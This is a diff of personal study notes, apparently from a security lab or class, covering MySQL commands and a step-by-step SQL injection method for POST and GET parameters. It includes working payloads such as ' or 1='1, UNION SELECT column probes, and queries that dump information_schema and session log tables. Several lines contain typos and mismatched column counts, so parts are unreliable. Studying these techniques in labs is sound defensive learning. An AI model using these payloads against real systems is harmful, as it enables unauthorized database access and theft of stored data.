@@ -173,25 +173,26 @@ SQL DATA BASE
             preformance_schema
             mysql
 
-to use a data base                                    DATABASE we will use is called session
-              >use informaton_schema ;
-              >show tables ;
-              >show columns from columns ;
-              >select table_schema,table_name,column_name from inforamation_schema.columns
-To Query to pull data stored in the following 
-              >select tireid,name,size from session.tires ;
+            to use a data base                                    DATABASE we will use is called session
+                          >use informaton_schema ;
+                          >show tables ;
+                          >show columns from columns ;
+                          >select table_schema,table_name,column_name from inforamation_schema.columns
+            To Query to pull data stored in the following 
+                          >select tireid,name,size from session.tires ;
 
 SQL Injection
+        POST METHOD
               1.ID vulnerable fields
               2. test out the ' or 1='1 with the inputs and see whats different with the number of columns/selections
               3. Use 'UNION SELECT 1,2,3,4,5 #               ## missing the 2 in the table shown, also we use 5 cause the table shows 4 so we try adding 1 over and over.
               4. Modified goldenstatment Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
               5. Craft queries: Audi' UNION SELECT tireid,2,name,size,cost,color,year from session.Tires #
                                 Audi' UNION SELECT tireid,name,size,cost,color,year,5 from session.Tires #
-                                
-
-
-
+        GET METHOD                      
+              change url to find vulnerable field, remove up to the char that changes everytime a different selction is made, add <UNNION SELECT 1,2,3> (cause of the 3 columns that show up normaly)
+              modify golden statement: Selection=2 UNION SELECT table_schema,column_name,table_name from information_schema.columns
+              craft query: Selection=2 UNION SELECT start,status,last_access from session.session_log            #put this into after the ?
 
 
 
